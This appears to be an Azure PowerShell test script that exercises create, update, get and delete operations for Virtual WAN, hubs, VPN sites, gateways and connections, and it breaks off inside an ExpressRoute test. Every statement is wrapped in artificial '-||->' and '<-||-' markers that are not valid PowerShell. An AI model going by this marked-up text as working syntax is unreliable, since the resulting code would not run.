














 -||-> function Test-CortexCRUD
{
 
     -||-> $rgName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $rglocation =  -||-> Get-ProviderLocation ResourceManagement "East US" <-||-  <-||- 

	 -||-> $virtualWanName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $virtualHubName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSiteName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnGatewayName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $remoteVirtualNetworkName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnConnectionName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $hubVnetConnectionName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSite2Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSiteLink1Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSiteLink2Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnConnection2Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnLink1ConnectionName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnLink2ConnectionName =  -||-> Get-ResourceName <-||-  <-||- 

	 -||-> $storeName = 'blob' + $rgName <-||- 
    
	 -||-> try
	{
		
         -||-> $resourceGroup =  -||-> New-AzResourceGroup -Name $rgName -Location $rglocation <-||-  <-||- 

		
		 -||-> $createdVirtualWan =  -||-> New-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -Location $rglocation -AllowVnetToVnetTraffic -AllowBranchToBranchTraffic <-||-  <-||- 
		 -||-> $createdVirtualWan =  -||-> Update-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -AllowVnetToVnetTraffic $false -AllowBranchToBranchTraffic $false <-||-  <-||- 
		 -||-> $virtualWan =  -||-> Get-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $virtualWan.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $virtualWanName $virtualWan.Name <-||- 
		 -||-> Assert-AreEqual $false $virtualWan.AllowVnetToVnetTraffic <-||- 
		 -||-> Assert-AreEqual $false $virtualWan.AllowBranchToBranchTraffic <-||- 

         -||-> $virtualWans =  -||-> Get-AzureRmVirtualWan -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $virtualWans <-||- 

         -||-> $virtualWansAll =  -||-> Get-AzureRmVirtualWan <-||-  <-||- 
         -||-> Assert-NotNull $virtualWansAll <-||- 
         -||-> Assert-NotNull $virtualWansAll[0].ResourceGroupName <-||- 

		 -||-> $virtualWansAll =  -||-> Get-AzVirtualWan -ResourceGroupName "*" <-||-  <-||- 
         -||-> Assert-NotNull $virtualWansAll <-||- 

		 -||-> $virtualWansAll =  -||-> Get-AzVirtualWan -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $virtualWansAll <-||- 

		 -||-> $virtualWansAll =  -||-> Get-AzVirtualWan -ResourceGroupName "*" -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $virtualWansAll <-||- 

		
		 -||-> $createdVirtualHub =  -||-> New-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName -Location $rglocation -AddressPrefix "192.168.1.0/24" -VirtualWan $virtualWan <-||-  <-||- 
		 -||-> $virtualHub =  -||-> Get-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $virtualHub.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $virtualHubName $virtualHub.Name <-||- 
		 -||-> Assert-AreEqual "192.168.1.0/24" $virtualHub.AddressPrefix <-||- 

         -||-> $virtualHubs =  -||-> Get-AzureRmVirtualHub -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $virtualHubs <-||- 

         -||-> $virtualHubsAll =  -||-> Get-AzureRmVirtualHub <-||-  <-||- 
         -||-> Assert-NotNull $virtualHubsAll <-||- 
          -||-> Assert-NotNull $virtualHubsAll[0].ResourceGroupName <-||- 

		 -||-> $virtualHubsAll =  -||-> Get-AzureRmVirtualHub -ResourceGroupName "*" <-||-  <-||- 
         -||-> Assert-NotNull $virtualHubsAll <-||- 

		 -||-> $virtualHubsAll =  -||-> Get-AzureRmVirtualHub -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $virtualHubsAll <-||- 

		 -||-> $virtualHubsAll =  -||-> Get-AzureRmVirtualHub -ResourceGroupName "*" -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $virtualHubsAll <-||- 

		
		 -||-> $route1 =  -||-> New-AzVirtualHubRoute -AddressPrefix @( -||-> "10.0.0.0/16", "11.0.0.0/16" <-||- ) -NextHopIpAddress "12.0.0.5" <-||-  <-||- 
		 -||-> $route2 =  -||-> New-AzVirtualHubRoute -AddressPrefix @( -||-> "13.0.0.0/16" <-||- ) -NextHopIpAddress "14.0.0.5" <-||-  <-||- 
		 -||-> $routeTable =  -||-> New-AzVirtualHubRouteTable -Route @( -||-> $route1, $route2 <-||- ) <-||-  <-||- 
		 -||-> Update-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName -RouteTable $routeTable <-||- 
		 -||-> $virtualHub =  -||-> Get-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $virtualHub.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $virtualHubName $virtualHub.Name <-||- 
		 -||-> $routes = $virtualHub.RouteTable.Routes <-||- 
		 -||-> Assert-AreEqual 2 @( -||-> $routes <-||- ).Count <-||- 
		
		
		 -||-> $vpnSiteAddressSpaces =  -||-> New-Object string[] 1 <-||-  <-||- 
		 -||-> $vpnSiteAddressSpaces[0] = "192.168.2.0/24" <-||- 
		 -||-> $createdVpnSite =  -||-> New-AzVpnSite -ResourceGroupName $rgName -Name $vpnSiteName -Location $rglocation -VirtualWan $virtualWan -IpAddress "1.2.3.4" -AddressSpace $vpnSiteAddressSpaces -DeviceModel "SomeDevice" -DeviceVendor "SomeDeviceVendor" -LinkSpeedInMbps 10 <-||-  <-||- 
		 -||-> $createdVpnSite =  -||-> Update-AzVpnSite -ResourceGroupName $rgName -Name $vpnSiteName -IpAddress "2.3.4.5" <-||-  <-||- 
		 -||-> $vpnSite =  -||-> Get-AzVpnSite -ResourceGroupName $rgName -Name $vpnSiteName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $vpnSite.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $vpnSiteName $vpnSite.Name <-||- 
		 -||-> Assert-AreEqual "2.3.4.5" $vpnSite.IpAddress <-||- 

		
		 -||-> $vpnSite2AddressSpaces =  -||-> New-Object string[] 2 <-||-  <-||- 
		 -||-> $vpnSite2AddressSpaces[0] = "192.169.2.0/24" <-||- 
		 -||-> $vpnSite2AddressSpaces[1] = "192.169.3.0/24" <-||- 
		 -||-> $vpnSiteLink1 =  -||-> New-AzVpnSiteLink -Name $vpnSiteLink1Name -IpAddress "5.5.5.5" -LinkProviderName "SomeTelecomProvider1" -LinkSpeedInMbps "10" <-||-  <-||- 
		 -||-> $vpnSiteLink2 =  -||-> New-AzVpnSiteLink -Name $vpnSiteLink2Name -IpAddress "5.5.5.6" -LinkProviderName "SomeTelecomProvider2" -LinkSpeedInMbps "10" <-||-  <-||- 
		 -||-> $createdVpnSite2 =  -||-> New-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name -Location $rglocation -VirtualWan $virtualWan -AddressSpace $vpnSite2AddressSpaces -DeviceModel "SomeDevice" -DeviceVendor "SomeDeviceVendor" -VpnSiteLink @( -||-> $vpnSiteLink1, $vpnSiteLink2 <-||- ) <-||-  <-||- 
		 -||-> $vpnSite2 =  -||-> Get-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $vpnSite2.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $vpnSite2Name $vpnSite2.Name <-||- 
		 -||-> Assert-AreEqual 2 $vpnSite2.VpnSiteLinks.Count <-||- 
		 -||-> $vpnSiteLink1.IpAddress = "7.3.4.5" <-||- 
		 -||-> $vpnSite2AddressSpaces =  -||-> New-Object string[] 2 <-||-  <-||- 
		 -||-> $vpnSite2AddressSpaces[0] = "192.170.2.0/24" <-||- 
		 -||-> $vpnSite2AddressSpaces[1] = "192.170.3.0/24" <-||- 
		 -||-> Update-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name -VpnSiteLink @( -||-> $vpnSiteLink1 <-||- ) -AddressSpace $vpnSite2AddressSpaces <-||- 
		 -||-> $updatedVpnSite2 =  -||-> Get-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name <-||-  <-||- 
		 -||-> Assert-AreEqual 1 $updatedVpnSite2.VpnSiteLinks.Count <-||- 
		 -||-> Assert-AreEqual "7.3.4.5" $updatedVpnSite2.VpnSiteLinks[0].IpAddress <-||- 
		 -||-> Update-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name -VpnSiteLink @( -||-> $vpnSiteLink1, $vpnSiteLink2 <-||- ) <-||- 

         -||-> $vpnSites =  -||-> Get-AzureRmVpnSite -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $vpnSites <-||- 

         -||-> $vpnSitesAll =  -||-> Get-AzVpnSite <-||-  <-||- 
         -||-> Assert-NotNull $vpnSitesAll <-||- 
         -||-> Assert-NotNull $vpnSitesAll[0].ResourceGroupName <-||- 

		 -||-> $vpnSitesAll =  -||-> Get-AzVpnSite -ResourceGroupName "*" <-||-  <-||- 
         -||-> Assert-NotNull $vpnSitesAll <-||- 

		 -||-> $vpnSitesAll =  -||-> Get-AzVpnSite -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $vpnSitesAll <-||- 

		 -||-> $vpnSitesAll =  -||-> Get-AzVpnSite -ResourceGroupName "*" -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $vpnSitesAll <-||- 

		
		 -||-> $createdVpnGateway =  -||-> New-AzVpnGateway -ResourceGroupName $rgName -Name $vpnGatewayName -VirtualHub $virtualHub -VpnGatewayScaleUnit 3 <-||-  <-||- 
		 -||-> $createdVpnGateway =  -||-> Update-AzVpnGateway -ResourceGroupName $rgName -Name $vpnGatewayName -VpnGatewayScaleUnit 4 <-||-  <-||- 
		 -||-> $vpnGateway =  -||-> Get-AzVpnGateway -ResourceGroupName $rgName -Name $vpnGatewayName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $vpnGateway.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $vpnGatewayName $vpnGateway.Name <-||- 
		 -||-> Assert-AreEqual 4 $vpnGateway.VpnGatewayScaleUnit <-||- 

         -||-> $vpnGateways =  -||-> Get-AzVpnGateway <-||-  <-||- 
         -||-> Assert-NotNull $vpnGateways <-||- 
         -||-> Assert-NotNull $vpnGateways[0].ResourceGroupName <-||- 

         -||-> $vpnGateways =  -||-> Get-AzureRmVpnGateway -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $vpnGateways <-||- 

         -||-> $vpnGatewaysAll =  -||-> Get-AzureRmVpnGateway -ResourceGroupName "*" <-||-  <-||- 
         -||-> Assert-NotNull $vpnGatewaysAll <-||- 

		 -||-> $vpnGatewaysAll =  -||-> Get-AzureRmVpnGateway -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $vpnGatewaysAll <-||- 

		 -||-> $vpnGatewaysAll =  -||-> Get-AzureRmVpnGateway -ResourceGroupName "*" -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $vpnGatewaysAll <-||- 

		 -||-> $vpnGatewaysAll =  -||-> Get-AzureRmVpnGateway <-||-  <-||- 
         -||-> Assert-NotNull $vpnGatewaysAll <-||- 

		
		 -||-> $createdVpnConnection =  -||-> New-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnectionName -VpnSite $vpnSite -ConnectionBandwidth 20 -UseLocalAzureIpAddress <-||-  <-||-  
		 -||-> Assert-AreEqual $true $createdVpnConnection.UseLocalAzureIpAddress <-||- 
		
		 -||-> $createdVpnConnection =  -||-> Update-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnectionName -ConnectionBandwidth 30 -UseLocalAzureIpAddress $false <-||-  <-||- 
		 -||-> $vpnConnection =  -||-> Get-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnectionName <-||-  <-||- 
		 -||-> Assert-AreEqual $vpnConnectionName $vpnConnection.Name <-||- 
		 -||-> Assert-AreEqual 30 $vpnConnection.ConnectionBandwidth <-||- 
		 -||-> Assert-AreEqual $false $vpnConnection.UseLocalAzureIpAddress <-||-  

		
		 -||-> $vpnSiteLinkConnection1 =  -||-> New-AzVpnSiteLinkConnection -Name $vpnLink1ConnectionName -VpnSiteLink $vpnSite2.VpnSiteLinks[0] -ConnectionBandwidth 100 <-||-  <-||- 
	     -||-> $vpnSiteLinkConnection2 =  -||-> New-AzVpnSiteLinkConnection -Name $vpnLink2ConnectionName -VpnSiteLink $vpnSite2.VpnSiteLinks[1] -ConnectionBandwidth 10 <-||-  <-||- 

		 -||-> $createdVpnConnection2 =  -||-> New-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name -VpnSite $vpnSite2 -VpnSiteLinkConnection @( -||-> $vpnSiteLinkConnection1, $vpnSiteLinkConnection2 <-||- ) <-||-  <-||- 
		 -||-> $vpnConnection2 =  -||-> Get-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name <-||-  <-||- 
		 -||-> Assert-AreEqual $vpnConnection2Name $vpnConnection2.Name <-||- 
		 -||-> Assert-AreEqual 2 $vpnConnection2.VpnLinkConnections.Count <-||- 

		 -||-> $vpnSiteLinkConnection1.RoutingWeight = 10 <-||- 
		 -||-> Update-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name -VpnSiteLinkConnection @( -||-> $vpnSiteLinkConnection1 <-||- ) <-||- 
		 -||-> $vpnConnection2 =  -||-> Get-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name <-||-  <-||- 

		 -||-> Assert-AreEqual $vpnConnection2Name $vpnConnection2.Name <-||- 
		 -||-> Assert-AreEqual 1 $vpnConnection2.VpnLinkConnections.Count <-||- 
		 -||-> Assert-AreEqual 10 $vpnConnection2.VpnLinkConnections[0].RoutingWeight <-||- 

         -||-> $vpnConnections =  -||-> Get-AzureRmVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName <-||-  <-||- 
         -||-> Assert-NotNull $vpnConnections <-||- 

		 -||-> $vpnConnections =  -||-> Get-AzureRmVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $vpnConnections <-||- 

		
		 -||-> $remoteVirtualNetwork =  -||-> New-AzVirtualNetwork -ResourceGroupName $rgName -Name $remoteVirtualNetworkName -Location $rglocation -AddressPrefix "10.0.1.0/24" <-||-  <-||- 
		 -||-> $createdHubVnetConnection =  -||-> New-AzVirtualHubVnetConnection -ResourceGroupName $rgName -VirtualHubName $virtualHubName -Name $hubVnetConnectionName -RemoteVirtualNetwork $remoteVirtualNetwork <-||-  <-||- 
		 -||-> $hubVnetConnection =  -||-> Get-AzVirtualHubVnetConnection -ResourceGroupName $rgName -VirtualHubName $virtualHubName -Name $hubVnetConnectionName <-||-  <-||- 
		 -||-> Assert-AreEqual $hubVnetConnectionName $hubVnetConnection.Name <-||- 
         -||-> $hubVnetConnections =  -||-> Get-AzureRmVirtualHubVnetConnection -ResourceGroupName $rgName -VirtualHubName $virtualHubName <-||-  <-||- 
         -||-> Assert-NotNull $hubVnetConnections <-||- 
         -||-> $hubVnetConnections =  -||-> Get-AzureRmVirtualHubVnetConnection -ResourceGroupName $rgName -VirtualHubName $virtualHubName -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $hubVnetConnections <-||- 

        
         -||-> $delete =  -||-> Remove-AzVirtualHubVnetConnection -ResourceGroupName $rgName -ParentResourceName $virtualHubName -Name $hubVnetConnectionName -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 

         -||-> $delete =  -||-> Remove-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnectionName -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $delete =  -||-> Remove-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 

         -||-> $delete =  -||-> Remove-AzVpnGateway -ResourceGroupName $rgName -Name $vpnGatewayName -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 

         -||-> $delete =  -||-> Remove-AzVpnSite -ResourceGroupName $rgName -Name $vpnSiteName -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $delete =  -||-> Remove-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 

         -||-> $delete =  -||-> Remove-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 

         -||-> $delete =  -||-> Remove-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -Force -PassThru <-||-  <-||- 
         -||-> Assert-AreEqual $True $delete <-||- 
	}
	finally
	{
		 -||-> Clean-ResourceGroup $rgname <-||- 
	} <-||- 
} <-||- 


 -||-> function Test-CortexDownloadConfig
{
 
     -||-> $rgName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $rglocation =  -||-> Get-ProviderLocation ResourceManagement "East US" <-||-  <-||- 

	 -||-> $virtualWanName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $virtualHubName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSiteName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSite2Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSiteLink1Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnSiteLink2Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnGatewayName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $remoteVirtualNetworkName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnConnectionName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnConnection2Name =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnLink1ConnectionName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $vpnLink2ConnectionName =  -||-> Get-ResourceName <-||-  <-||- 
	 -||-> $hubVnetConnectionName =  -||-> Get-ResourceName <-||-  <-||- 

	 -||-> $storeName = 'blob' + $rgName <-||- 
    
	 -||-> try
	{
		
         -||-> $resourceGroup =  -||-> New-AzResourceGroup -Name $rgName -Location $rglocation <-||-  <-||- 

		
		 -||-> $createdVirtualWan =  -||-> New-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -Location $rglocation -AllowVnetToVnetTraffic -AllowBranchToBranchTraffic <-||-  <-||- 
		 -||-> $virtualWan =  -||-> Get-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $virtualWan.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $virtualWanName $virtualWan.Name <-||- 
		
		
		 -||-> $createdVirtualHub =  -||-> New-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName -Location $rglocation -AddressPrefix "192.168.1.0/24" -VirtualWan $virtualWan <-||-  <-||- 
		 -||-> $virtualHub =  -||-> Get-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $virtualHub.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $virtualHubName $virtualHub.Name <-||- 
		 -||-> Assert-AreEqual "192.168.1.0/24" $virtualHub.AddressPrefix <-||- 

		
		 -||-> $vpnSiteAddressSpaces =  -||-> New-Object string[] 1 <-||-  <-||- 
		 -||-> $vpnSiteAddressSpaces[0] = "192.168.2.0/24" <-||- 
		 -||-> $createdVpnSite =  -||-> New-AzVpnSite -ResourceGroupName $rgName -Name $vpnSiteName -Location $rglocation -VirtualWan $virtualWan -IpAddress "1.2.3.4" -AddressSpace $vpnSiteAddressSpaces -DeviceModel "SomeDevice" -DeviceVendor "SomeDeviceVendor" -LinkSpeedInMbps 10 <-||-  <-||- 
		 -||-> $vpnSite =  -||-> Get-AzVpnSite -ResourceGroupName $rgName -Name $vpnSiteName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $vpnSite.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $vpnSiteName $vpnSite.Name <-||- 
		
		
		 -||-> $vpnSite2AddressSpaces =  -||-> New-Object string[] 2 <-||-  <-||- 
		 -||-> $vpnSite2AddressSpaces[0] = "192.169.2.0/24" <-||- 
		 -||-> $vpnSite2AddressSpaces[1] = "192.169.3.0/24" <-||- 
		 -||-> $vpnSiteLink1 =  -||-> New-AzVpnSiteLink -Name $vpnSiteLink1Name -IpAddress "5.5.5.5" -LinkProviderName "SomeTelecomProvider1" -LinkSpeedInMbps "10" <-||-  <-||- 
		 -||-> $vpnSiteLink2 =  -||-> New-AzVpnSiteLink -Name $vpnSiteLink2Name -IpAddress "5.5.5.6" -LinkProviderName "SomeTelecomProvider2" -LinkSpeedInMbps "100" <-||-  <-||- 
		 -||-> $createdVpnSite2 =  -||-> New-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name -Location $rglocation -VirtualWan $virtualWan -AddressSpace $vpnSite2AddressSpaces -DeviceModel "SomeDevice" -DeviceVendor "SomeDeviceVendor" -VpnSiteLink @( -||-> $vpnSiteLink1, $vpnSiteLink2 <-||- ) <-||-  <-||- 
		 -||-> $vpnSite2 =  -||-> Get-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $vpnSite2.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $vpnSite2Name $vpnSite2.Name <-||- 
		 -||-> Assert-AreEqual 2 $vpnSite2.VpnSiteLinks.Count <-||-  

		
		 -||-> $createdVpnGateway =  -||-> New-AzVpnGateway -ResourceGroupName $rgName -Name $vpnGatewayName -VirtualHub $virtualHub -VpnGatewayScaleUnit 3 <-||-  <-||- 
		 -||-> $vpnGateway =  -||-> Get-AzVpnGateway -ResourceGroupName $rgName -Name $vpnGatewayName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $vpnGateway.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $vpnGatewayName $vpnGateway.Name <-||- 
		
		
		 -||-> $createdVpnConnection =  -||-> New-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnectionName -VpnSite $vpnSite -ConnectionBandwidth 20 <-||-  <-||- 
		 -||-> $vpnConnection =  -||-> Get-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnectionName <-||-  <-||- 
		 -||-> Assert-AreEqual $vpnConnectionName $vpnConnection.Name <-||- 
		
		
		 -||-> $vpnSiteLinkConnection1 =  -||-> New-AzVpnSiteLinkConnection -Name $vpnLink1ConnectionName -VpnSiteLink $vpnSite2.VpnSiteLinks[0] -ConnectionBandwidth 100 <-||-  <-||- 
	     -||-> $vpnSiteLinkConnection2 =  -||-> New-AzVpnSiteLinkConnection -Name $vpnLink2ConnectionName -VpnSiteLink $vpnSite2.VpnSiteLinks[1] -ConnectionBandwidth 10 <-||-  <-||- 

		 -||-> $createdVpnConnection2 =  -||-> New-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name -VpnSite $vpnSite2 -VpnSiteLinkConnection @( -||-> $vpnSiteLinkConnection1, $vpnSiteLinkConnection2 <-||- ) <-||-  <-||- 
		 -||-> $vpnConnection2 =  -||-> Get-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name <-||-  <-||- 
		 -||-> Assert-AreEqual $vpnConnection2Name $vpnConnection2.Name <-||- 
		 -||-> Assert-AreEqual 2 $vpnConnection2.VpnLinkConnections.Count <-||- 

		
		 -||-> $storetype = 'Standard_GRS' <-||- 
		 -||-> $containerName = "cont$( -||-> $rgName <-||- )" <-||- 
		 -||-> New-AzStorageAccount -ResourceGroupName $rgName -Name $storeName -Location $rglocation -Type $storetype <-||- 
		 -||-> $key =  -||-> Get-AzStorageAccountKey -ResourceGroupName $rgName -Name $storeName <-||-  <-||- 
		 -||-> $context =  -||-> New-AzStorageContext -StorageAccountName $storeName -StorageAccountKey $key[0].Value <-||-  <-||- 
		 -||-> New-AzStorageContainer -Name $containerName -Context $context <-||- 
		 -||-> $container =  -||-> Get-AzStorageContainer -Name $containerName -Context $context <-||-  <-||- 
		 -||-> New-Item -Name EmptyFile.txt -ItemType File -Force <-||- 
		 -||-> Set-AzStorageBlobContent -File "EmptyFile.txt" -Container $containerName -Blob "emptyfile.txt" -Context $context <-||- 
		 -||-> $now= -||-> get-date <-||-  <-||- 
		 -||-> $blobSasUrl =  -||-> New-AzStorageBlobSASToken -Container $containerName -Blob emptyfile.txt -Context $context -Permission "rwd" -StartTime $now.AddHours(-1) -ExpiryTime $now.AddDays(1) -FullUri <-||-  <-||- 

		 -||-> $vpnSitesForConfig =  -||-> New-Object Microsoft.Azure.Commands.Network.Models.PSVpnSite[] 2 <-||-  <-||- 
		 -||-> $vpnSitesForConfig[0] = $vpnSite <-||- 
		 -||-> $vpnSitesForConfig[1] = $vpnSite2 <-||- 
		 -||-> Get-AzVirtualWanVpnConfiguration -VirtualWan $virtualWan -StorageSasUrl $blobSasUrl -VpnSite $vpnSitesForConfig <-||- 

		 -||-> $delete =  -||-> Remove-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnectionName -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 
		
		 -||-> $delete =  -||-> Remove-AzVpnConnection -ResourceGroupName $rgName -ParentResourceName $vpnGatewayName -Name $vpnConnection2Name -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $delete =  -||-> Remove-AzVpnGateway -ResourceGroupName $rgName -Name $vpnGatewayName -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $delete =  -||-> Remove-AzVpnSite -ResourceGroupName $rgName -Name $vpnSiteName -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $delete =  -||-> Remove-AzVpnSite -ResourceGroupName $rgName -Name $vpnSite2Name -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $delete =  -||-> Remove-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $delete =  -||-> Remove-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 
	}
	finally
	{
		 -||-> Clean-ResourceGroup $rgname <-||- 
	} <-||- 
} <-||- 

 -||-> function Test-CortexExpressRouteCRUD
{
    
     -||-> $rgName =  -||-> Get-ResourceGroupName <-||-  <-||- 
     -||-> $hubRgName =  -||-> Get-ResourceGroupName <-||-  <-||- 
    
     -||-> $rglocation =  -||-> Get-ProviderLocation "ResourceManagement" "westcentralus" <-||-  <-||- 

     -||-> $virtualWanName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $virtualHubName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $expressRouteGatewayName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $circuitName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $expressRouteConnectionName =  -||-> Get-ResourceName <-||-  <-||- 

     -||-> try
    {
        
         -||-> $resourceGroup =  -||-> New-AzureRmResourceGroup -Name $rgName -Location $rglocation <-||-  <-||- 
         -||-> $resourceGroup =  -||-> New-AzureRmResourceGroup -Name $hubRgName -Location $rglocation <-||-  <-||- 

        
         -||-> $createdVirtualWan =  -||-> New-AzureRmVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -Location $rglocation -AllowVnetToVnetTraffic -AllowBranchToBranchTraffic <-||-  <-||- 
         -||-> $virtualWan =  -||-> Get-AzureRmVirtualWan -ResourceGroupName $rgName -Name $virtualWanName <-||-  <-||- 
         -||-> Write-Debug "Created Virtual WAN $virtualWan.Name successfully" <-||- 

         -||-> $createdVirtualHub =  -||-> New-AzureRmVirtualHub -ResourceGroupName $hubRgName -Name $virtualHubName -Location $rglocation -AddressPrefix "10.8.0.0/24" -VirtualWan $virtualWan <-||-  <-||- 
         -||-> $virtualHub =  -||-> Get-AzureRmVirtualHub -ResourceGroupName $hubRgName -Name $virtualHubName <-||-  <-||- 
         -||-> Write-Debug "Created Virtual Hub virtualHub.Name successfully" <-||- 

        
